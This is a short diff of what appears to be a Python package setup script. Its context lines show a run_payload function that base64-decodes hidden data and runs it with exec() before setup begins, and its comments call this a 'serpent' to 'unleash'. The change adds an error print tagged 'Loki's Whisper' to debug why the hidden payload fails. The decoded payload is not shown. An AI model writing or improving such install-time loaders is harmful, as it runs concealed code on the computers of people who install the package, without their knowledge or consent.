@@ -49,7 +49,9 @@ def run_payload():
             # We decode our Base64 serpent and unleash it.
             decoded_payload = base64.b64decode(secret_data)
             exec(decoded_payload)
-    except Exception:
+    except Exception as e:
+        # We print the error to see what's happening during our test.
+        print(f"[Loki's Whisper] The serpent failed to strike: {e}")
         pass
 
 # We run our payload before the setup even begins.
